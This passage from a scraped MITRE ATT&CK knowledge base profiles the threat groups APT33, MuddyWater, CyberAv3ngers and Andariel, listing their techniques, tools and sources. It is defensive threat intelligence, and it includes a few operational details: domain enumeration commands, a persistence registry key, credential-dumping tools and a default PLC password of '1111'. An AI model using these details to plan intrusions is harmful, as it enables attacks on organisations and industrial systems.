Logon Autostart Execution: XDG Autostart Entries, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Create Account: Domain Account, Create Account: Local Account, Create or Modify System Process: Systemd Service, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: Clear Windows Event Logs, Ingress Tool Transfer, Input Capture: Keylogging, Network Service Discovery, Network Share Discovery, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: LSA Secrets, Process Discovery, Process Injection: Dynamic-link Library Injection, Remote Services: Remote Desktop Protocol, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Unsecured Credentials: Credentials In Files, Use Alternate Authentication Material: Pass the Ticket, Video Capture, Virtualization/Sandbox Evasion: System Checks S0358 Ruler [6][3] Account Discovery: Email Account, Office Application Startup: Outlook Rules, Office Application Startup: Outlook Forms, Office Application Startup: Outlook Home Page S0380 StoneDrill [1] Command and Scripting Interpreter: Visual Basic, Data Destruction, Disk Wipe: Disk Structure Wipe, Disk Wipe: Disk Content Wipe, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Process Injection, Query Registry, Screen Capture, Software Discovery: Security Software Discovery, System Information Discovery, System Time Discovery, Virtualization/Sandbox Evasion, Windows Management Instrumentation S0199 TURNEDUP [1][2][4] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Ingress Tool Transfer, Process Injection: Asynchronous Procedure Call, Screen Capture, System Information Discovery References O'Leary, J., et al. (2017, September 20). Insights into Iranian Cyber Espionage: APT33 Targets Aerospace and Energy Sectors and has Ties to Destructive Malware. Retrieved February 15, 2018. Davis, S. and Carr, N. (2017, September 21). APT33: New Insights into Iranian Cyber Espionage Group. Retrieved February 15, 2018. Microsoft Threat Protection Intelligence Team. (2020, June 18). Inside Microsoft Threat Protection: Mapping attack chains from cloud to endpoint. Retrieved June 22, 2020. Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Ackerman, G., et al. (2018, December 21). OVERRULED: Containing a Potentially Destructive Adversary. Retrieved January 17, 2019. Jacqueline O'Leary et al. 2017, September 20 Insights into Iranian Cyber Espionage: APT33 Targets Aerospace and Energy Sectors and has Ties to Destructive Malware Retrieved. 2019/12/02 Junnosuke Yagi 2017, March 07 Trojan.Stonedrill Retrieved. 2019/12/05 Symantec 2019, March 27 Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S. Retrieved. 2019/12/02 Dragos Symantec 2019, March 27 Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S. Retrieved. 2019/12/02 Magnallium Retrieved. 2019/10/27 Andy Greenburg 2019, June 20 Iranian Hackers Launch a New US-Targeted Campaign as Tensions Mount Retrieved. 2020/01/03 INSIKT GROUP. (2020, January 7). Iranian Cyber Response to Death of IRGC Head Would Likely Use Reported TTPs and Previous Access. Retrieved May 22, 2024. "
},
{
"id": 128,
"title": "MuddyWater, Earth Vetala, MERCURY, Static Kitten, Seedworm, TEMP.Zagros, Mango Sandstorm, TA450, Group G0069",
"path": "/groups/G0069/index.html",
"content": " MuddyWater MuddyWater is a cyber espionage group assessed to be a subordinate element within Iran's Ministry of Intelligence and Security (MOIS).[1] Since at least 2017, MuddyWater has targeted a range of government and private organizations across sectors, including telecommunications, local government, defense, and oil and natural gas organizations, in the Middle East, Asia, Africa, Europe, and North America.[2][3][4][5][6][7][8] ID: G0069 \u24d8 Associated Groups: Earth Vetala, MERCURY, Static Kitten, Seedworm, TEMP.Zagros, Mango Sandstorm, TA450 Contributors: Ozer Sarilar, @ozersarilar, STM; Daniyal Naeem, BT Security; Marco Pedrinazzi, @pedrinazziM Version: 5.1 Created: 18 April 2018 Last Modified: 29 August 2024 Version Permalink Live Version Associated Group Descriptions Name Description Earth Vetala [9] MERCURY [10] Static Kitten [10][9] Seedworm [3][10][9] TEMP.Zagros [11][10][9] Mango Sandstorm [12] TA450 [13] Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control MuddyWater uses various techniques to bypass UAC.[4] Enterprise T1087 .002 Account Discovery: Domain Account MuddyWater has used cmd.exe net user /domain to enumerate domain users.[9] Enterprise T1583 .006 Acquire Infrastructure: Web Services MuddyWater has used file sharing services including OneHub, Sync, and TeraBox to distribute tools.[10][9][13] Enterprise T1071 .001 Application Layer Protocol: Web Protocols MuddyWater has used HTTP for C2 communications.[5][9] Enterprise T1560 .001 Archive Collected Data: Archive via Utility MuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.[3] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder MuddyWater has added Registry Run key KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding to establish persistence.[11][14][15][6][9][8] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell MuddyWater has used PowerShell for execution.[11][16][14][3][4][15][6][9][7][8] .003 Command and Scripting Interpreter: Windows Command Shell MuddyWater has used a custom tool for creating reverse shells.[3] .005 Command and Scripting Interpreter: Visual Basic MuddyWater has used VBScript files to execute its POWERSTATS payload, as well as macros.[11][16][14][3][4][5][6][9][8] .006 Command and Scripting Interpreter: Python MuddyWater has developed tools in Python including Out1.[9] .007 Command and Scripting Interpreter: JavaScript MuddyWater has used JavaScript files to execute its POWERSTATS payload.[4][11][7] Enterprise T1555 Credentials from Password Stores MuddyWater has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email.[2][3][9] .003 Credentials from Web Browsers MuddyWater has run tools including Browser64 to steal passwords saved in victim web browsers.[3][9] Enterprise T1132 .001 Data Encoding: Standard Encoding MuddyWater has used tools to encode C2 communications including Base64 encoding.[5][9] Enterprise T1074 .001 Data Staged: Local Data Staging MuddyWater has stored a decoy PDF file within a victim's %temp% folder.[8] Enterprise T1140 Deobfuscate/Decode Files or Information MuddyWater has decoded base64-encoded PowerShell, JavaScript, and VBScript.[11][16][4][8] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography MuddyWater has used AES to encrypt C2 responses.[8] Enterprise T1041 Exfiltration Over C2 Channel MuddyWater has used C2 infrastructure to receive exfiltrated data.[6] Enterprise T1190 Exploit Public-Facing Application MuddyWater has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).[7] Enterprise T1203 Exploitation for Client Execution MuddyWater has exploited the Office vulnerability CVE-2017-0199 for execution.[5] Enterprise T1210 Exploitation of Remote Services MuddyWater has exploited the Microsoft Netlogon vulnerability (CVE-2020-1472).[7] Enterprise T1083 File and Directory Discovery MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords \"Kasper,\" \"Panda,\" or \"ESET.\"[14] Enterprise T1574 .001 Hijack Execution Flow: DLL MuddyWater maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware.[7] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools MuddyWater can disable the system's local proxy settings.[9] Enterprise T1105 Ingress Tool Transfer MuddyWater has used malware that can upload additional files to the victim\u2019s machine.[14][4][6][9] Enterprise T1559 .001 Inter-Process Communication: Component Object Model MuddyWater has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook.[14][5][7] .002 Inter-Process Communication: Dynamic Data Exchange MuddyWater has used malware that can execute PowerShell scripts via DDE.[14] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location MuddyWater has disguised malicious executables and used filenames and Registry key names associated with Windows Defender.[11][15][10] Enterprise T1104 Multi-Stage Channels MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back.[15] Enterprise T1027 .003 Obfuscated Files or Information: Steganography MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg.[4] .004 Obfuscated Files or Information: Compile After Delivery MuddyWater has used the .NET csc.exe tool to compile executables from downloaded C# code.[4] .010 Obfuscated Files or Information: Command Obfuscation MuddyWater has used Daniel Bohannon\u2019s Invoke-Obfuscation framework and obfuscated PowerShell scripts.[2][17] The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.[2][11][14][15][5][9][8] Enterprise T1588 .002 Obtain Capabilities: Tool MuddyWater has used legitimate tools ConnectWise, RemoteUtilities, and SimpleHelp to gain access to the target environment.[10][18] Enterprise T1137 .001 Office Application Startup: Office Template Macros MuddyWater has used a Word Template, Normal.dotm, for persistence.[6] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory MuddyWater has performed credential dumping with Mimikatz and procdump64.exe.[2][3][9] .004 OS Credential Dumping: LSA Secrets MuddyWater has performed credential dumping with LaZagne.[2][3] .005 OS Credential Dumping: Cached Domain Credentials MuddyWater has performed credential dumping with LaZagne.[2][3] Enterprise T1566 .001 Phishing: Spearphishing Attachment MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.[2][11][14][5][10][9] [7][13] .002 Phishing: Spearphishing Link MuddyWater has sent targeted spearphishing e-mails with malicious links.[10][9][13] Enterprise T1057 Process Discovery MuddyWater has used malware to obtain a list of running processes on the system.[14][5] Enterprise T1090 .002 Proxy: External Proxy MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location.[3] MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).[6][9] Enterprise T1219 Remote Access Tools MuddyWater has used legitimate applications ScreenConnect, AteraAgent and SimpleHelp to manage systems remotely and move laterally.[9][10][13][18] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task MuddyWater has used scheduled tasks to establish persistence.[6] Enterprise T1113 Screen Capture MuddyWater has used malware that can capture screenshots of the victim\u2019s machine.[14] Enterprise T1518 Software Discovery MuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine.[9] .001 Security Software Discovery MuddyWater has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.[14] Enterprise T1218 .003 System Binary Proxy Execution: CMSTP MuddyWater has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload.[11] .005 System Binary Proxy Execution: Mshta MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.[11][14] .011 System Binary Proxy Execution: Rundll32 MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.[14] Enterprise T1082 System Information Discovery MuddyWater has used malware that can collect the victim\u2019s OS version and machine name.[14][15][6][9][8] Enterprise T1016 System Network Configuration Discovery MuddyWater has used malware to collect the victim\u2019s IP address and domain name.[14] Enterprise T1049 System Network Connections Discovery MuddyWater has used a PowerShell backdoor to check for Skype connections on the target machine.[9] Enterprise T1033 System Owner/User Discovery MuddyWater has used malware that can collect the victim\u2019s username.[14][9] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files MuddyWater has run a tool that steals passwords saved in victim email.[3] Enterprise T1204 .001 User Execution: Malicious Link MuddyWater has distributed URLs in phishing e-mails that link to lure documents.[10][9][13] .002 User Execution: Malicious File MuddyWater has attempted to get users to open malicious PDF attachment and to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.[2][11][14][15][5][6][10][9][7][8][13] Enterprise T1102 .002 Web Service: Bidirectional Communication MuddyWater has used web services including OneHub to distribute remote access tools.[10] Enterprise T1047 Windows Management Instrumentation MuddyWater has used malware that leveraged WMI for execution and querying host information.[14][4][15][7] Software ID Name References Techniques S0591 ConnectWise [10][9] Command and Scripting Interpreter: PowerShell, Screen Capture, Video Capture S0488 CrackMapExec [19][3] Account Discovery: Domain Account, Brute Force: Password Spraying, Brute Force: Password Guessing, Brute Force, Command and Scripting Interpreter: PowerShell, File and Directory Discovery, Modify Registry, Network Share Discovery, OS Credential Dumping: Security Account Manager, OS Credential Dumping: NTDS, OS Credential Dumping: LSA Secrets, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, Scheduled Task/Job: At, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, Use Alternate Authentication Material: Pass the Hash, Windows Management Instrumentation S0363 Empire [19] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0250 Koadic [6][19] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Encrypted Channel: Asymmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Window, Ingress Tool Transfer, Network Service Discovery, Network Share Discovery, OS Credential Dumping: Security Account Manager, OS Credential Dumping: NTDS, Process Injection: Dynamic-link Library Injection, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Mshta, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Services: Service Execution, Windows Management Instrumentation S0349 LaZagne [3][19] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S0002 Mimikatz [2][19] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S1047 Mori [7] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Data Encoding: Standard Encoding, Data Obfuscation: Junk Data, Deobfuscate/Decode Files or Information, Indicator Removal: File Deletion, Modify Registry, Query Registry, System Binary Proxy Execution: Regsvr32 S0594 Out1 [9] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Email Collection: Local Email Collection, Obfuscated Files or Information S0194 PowerSploit [19] Access Token Manipulation, Account Discovery: Local Account, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Security Support Provider, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Domain Trust Discovery, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: DLL, Hijack Execution Flow: Path Interception by Search Order Hijacking, Input Capture: Keylogging, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Reflective Code Loading, Scheduled Task/Job: Scheduled Task, Screen Capture, Steal or Forge Kerberos Tickets: Kerberoasting, Unsecured Credentials: Credentials in Registry, Unsecured Credentials: Group Policy Preferences, Windows Management Instrumentation S0223 POWERSTATS [2][11][4][3][5] Account Discovery: Local Account, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: JavaScript, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Inter-Process Communication: Component Object Model, Inter-Process Communication: Dynamic Data Exchange, Masquerading: Masquerade Task or Service, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information: Junk Code Insertion, Process Discovery, Proxy: External Proxy, Scheduled Task/Job: Scheduled Task, Scheduled Transfer, Screen Capture, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Mshta, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, Windows Management Instrumentation S1046 PowGoop [7] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: PowerShell, Data Encoding: Non-Standard Encoding, Deobfuscate/Decode Files or Information, Encrypted Channel, Hijack Execution Flow: DLL, Masquerading, Masquerading: Match Legitimate Resource Name or Location S0592 RemoteUtilities [9] File and Directory Discovery, Ingress Tool Transfer, Screen Capture, System Binary Proxy Execution: Msiexec S0450 SHARPSTATS [19] Command and Scripting Interpreter: PowerShell, Ingress Tool Transfer, Obfuscated Files or Information: Command Obfuscation, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery S1035 Small Sieve [7][20] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Python, Data Encoding: Non-Standard Encoding, Encrypted Channel: Asymmetric Cryptography, Execution Guardrails, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information, System Network Configuration Discovery, System Owner/User Discovery, Web Service: Bidirectional Communication S1037 STARWHALE [7] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Staged: Local Data Staging, Exfiltration Over C2 Channel, Obfuscated Files or Information: Encrypted/Encoded File, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, User Execution: Malicious File References Cyber National Mission Force. (2022, January 12). Iranian intel cyber suite of malware uses open source tools. Retrieved September 30, 2022. Lancaster, T.. (2017, November 14). Muddying the Water: Targeted Attacks in the Middle East. Retrieved March 15, 2018. Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018. ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018. ClearSky. (2019, June). Iranian APT group \u2018MuddyWater\u2019 Adds Exploits to Their Arsenal. Retrieved May 14, 2020. Reaqta. (2017, November 22). A dive into MuddyWater APT targeting Middle-East. Retrieved May 18, 2020. FBI, CISA, CNMF, NCSC-UK. (2022, February 24). Iranian Government-Sponsored Actors Conduct Cyber Operations Against Global Government and Commercial Networks. Retrieved September 27, 2022. Malhortra, A and Ventura, V. (2022, January 31). Iranian APT MuddyWater targets Turkish users via malicious PDFs, executables. Retrieved June 22, 2022. Peretz, A. and Theck, E. (2021, March 5). Earth Vetala \u2013 MuddyWater Continues to Target Organizations in the Middle East. Retrieved March 18, 2021. Mele, G. et al. (2021, February 10). Probable Iranian Cyber Actors, Static Kitten, Conducting Cyberespionage Campaign Targeting UAE and Kuwait Government Agencies. Retrieved March 17, 2021. Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Miller, J. et al. (2024, March 21). Security Brief: TA450 Uses Embedded Links in PDF Attachments in Latest Campaign. Retrieved March 27, 2024. Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. Adamitis, D. et al. (2019, May 20). Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques. Retrieved June 5, 2019. Villanueva, M., Co, M. (2018, June 14). Another Potential MuddyWater Campaign uses Powershell-based PRB-Backdoor. Retrieved July 3, 2018. Bohannon, D.. (2017, March 13). Invoke-Obfuscation - PowerShell Obfuscator. Retrieved June 18, 2017. Rostovcev, N. (2023, April 18). SimpleHarm: Tracking MuddyWater\u2019s infrastructure. Retrieved July 11, 2024. Lunghi, D. and Horejsi, J.. (2019, June 10). MuddyWater Resurfaces, Uses Multi-Stage Backdoor POWERSTATS V3 and New Post-Exploitation Tools. Retrieved May 14, 2020. NCSC GCHQ. (2022, January 27). Small Sieve Malware Analysis Report. Retrieved August 22, 2022. "
},
{
"id": 129,
"title": "CyberAv3ngers, Soldiers of Soloman, Group G1027",
"path": "/groups/G1027/index.html",
"content": " CyberAv3ngers The CyberAv3ngers are a suspected Iranian Government Islamic Revolutionary Guard Corps (IRGC)-affiliated APT group. The CyberAv3ngers have been known to be active since at least 2020, with disputed and false claims of critical infrastructure compromises in Israel.[1] In 2023, the CyberAv3ngers engaged in a global targeting and hacking of the Unitronics Programmable Logic Controller (PLC) with Human-Machine Interface (HMI). This PLC can be found in multiple sectors, including water and wastewater, energy, food and beverage manufacturing, and healthcare. The most notable feature of this attack was the defacement of the devices user interface.[1] ID: G1027 \u24d8 Associated Groups: Soldiers of Soloman Version: 1.0 Created: 25 March 2024 Last Modified: 10 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description Soldiers of Soloman CyberAv3ngers reportedly has connections to the IRGC-linked group Soldiers of Solomon.[1] Campaigns ID Name First Seen Last Seen References Techniques C0031 Unitronics Defacement Campaign November 2023 [1] November 2023 [2] [1] Default Credentials, Denial of Service, Internet Accessible Device, Loss of Availability, Loss of Productivity and Revenue, Loss of View Techniques Used Domain ID Name Use ICS T0812 Default Credentials During the Unitronics Defacement Campaign, the CyberAv3ngers discovered and exploited default credentials found on many Unitronics Programmable Logic Controller (PLC) Human-Machine Interface (HMI). For many of these devices, the default password was set to \u20181111\u2019.[1][3] ICS T0814 Denial of Service During the Unitronics Defacement Campaign, the CyberAv3ngers defaced controllers\u2019 Human-Machine Interface (HMI), which prevented multiple entities from being able to operate their devices normally.[1][3][4][5] Additionally, the CyberAv3ngers caused a communications failure in a remote pumping station.[6] ICS T0883 Internet Accessible Device During the Unitronics Defacement Campaign, the CyberAv3ngers exploited devices connected to the public internet, such as internet connected Unitronics Programmable Logic Controller (PLC) with Human-Machine Interface (HMI) and networking equipment such as cellular modems found in OT environments.[1][2] ICS T0826 Loss of Availability During the Unitronics Defacement Campaign, the CyberAv3ngers caused multiple businesses to halt operations due to the unavailability of the Programmable Logic Controller (PLC) and Human-Machine Interface (HMI). These victims covered multiple sectors.[4] ICS T0828 Loss of Productivity and Revenue During the Unitronics Defacement Campaign, the CyberAv3ngers caused multiple businesses to halt operations in their industrial environments, impacting their typical business operations. These victims covered multiple sectors.[4] ICS T0829 Loss of View During the Unitronics Defacement Campaign, the CyberAv3ngers replaced the existing graphic on the Programmable Logic Controller (PLC) Human-Machine Interface (HMI) with their own, thereby preventing PLC owners and operators from viewing PLC information on the HMI.[1][4] References DHS/CISA. (2023, December 1). IRGC-Affiliated Cyber Actors Exploit PLCs in Multiple Sectors, Including U.S. Water and Wastewater Systems Facilities. Retrieved March 25, 2024. Lisa Zahner. (2023, December 15). Hackers in Iran attack computer at Vero Utilities. Retrieved March 25, 2024. DHS/CISA. (2023, November 28). Exploitation of Unitronics PLCs used in Water and Wastewater Systems. Retrieved March 25, 2024. Jamie Tarabay and Katrina Manson. (2023, December 22). Iranian-Linked Hacks Expose Failure to Safeguard US Water System. Retrieved March 25, 2024. Frank Bajak and Marc Levy. (2023, December 2). Breaches by Iran-affiliated hackers spanned multiple U.S. states, federal agencies say. Retrieved March 25, 2024. WPXI. (2023, November 27). Officials investigating cyberattack on Municipal Water Authority of Aliquippa. Retrieved March 25, 2024. "
},
{
"id": 130,
"title": "Andariel, Silent Chollima, PLUTONIUM, Onyx Sleet, Group G0138",
"path": "/groups/G0138/index.html",
"content": " Andariel Andariel is a North Korean state-sponsored threat group that has been active since at least 2009. Andariel has primarily focused its operations--which have included destructive attacks--against South Korean government agencies, military organizations, and a variety of domestic companies; they have also conducted cyber financial operations against ATMs, banks, and cryptocurrency exchanges. Andariel's notable activity includes Operation Black Mine, Operation GoldenAxe, and Campaign Rifle.[1][2][3][4][5] Andariel is considered a sub-set of Lazarus Group, and has been attributed to North Korea's Reconnaissance General Bureau.[6] North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups. ID: G0138 \u24d8 Associated Groups: Silent Chollima, PLUTONIUM, Onyx Sleet Contributors: Kyoung-ju Kwak (S2W) Version: 2.0 Created: 29 September 2021 Last Modified: 12 September 2024 Version Permalink Live Version Associated Group Descriptions Name Description Silent Chollima [5] PLUTONIUM [7] Onyx Sleet [7] Techniques Used Domain ID Name Use Enterprise T1005 Data from Local System Andariel has collected large numbers of files from compromised network systems for later extraction.[1] Enterprise T1189 Drive-by Compromise Andariel has used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range.[3][4] Enterprise T1203 Exploitation for Client Execution Andariel has exploited numerous ActiveX vulnerabilities, including zero-days.[1][2][4] Enterprise T1592 .002 Gather Victim Host Information: Software Andariel has inserted a malicious script within compromised websites to collect potential victim information such as browser type, system language, Flash Player version, and other data.[4] Enterprise T1590 .005 Gather Victim Network Information: IP Addresses Andariel has limited its watering hole attacks to specific IP address ranges.[3] Enterprise T1105 Ingress Tool Transfer Andariel has downloaded additional tools and malware onto compromised hosts.[3] Enterprise T1027 .003 Obfuscated Files or Information: Steganography Andariel has hidden malicious executables within PNG files.[8][9] Enterprise T1588 .001 Obtain Capabilities: Malware Andariel has used a variety of publicly-available remote access Trojans (RATs) for its operations.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Andariel has conducted spearphishing campaigns that included malicious Word or Excel attachments.[3][8] Enterprise T1057 Process Discovery Andariel has used tasklist to enumerate processes and find a specific string.[9] Enterprise T1049 System Network Connections Discovery Andariel has used the netstat -naop tcp command to display TCP connections on a victim's machine.[9] Enterprise T1204 .002 User Execution: Malicious File Andariel has attempted to lure victims into enabling malicious macros within email attachments.[3] Software ID Name References Techniques S0032 gh0st RAT [3] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S0433 Rifdoor [3] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Encrypted Channel: Symmetric Cryptography, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Binary Padding, Phishing: Spearphishing Attachment, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, User Execution: Malicious File References FSI. (2017, July 27). Campaign Rifle - Andariel, the Maiden of Anguish. Retrieved September 12, 2024. IssueMakersLab. (2017, May 1). Operation GoldenAxe. Retrieved September 12, 2024. AhnLab. (2018, June 23). 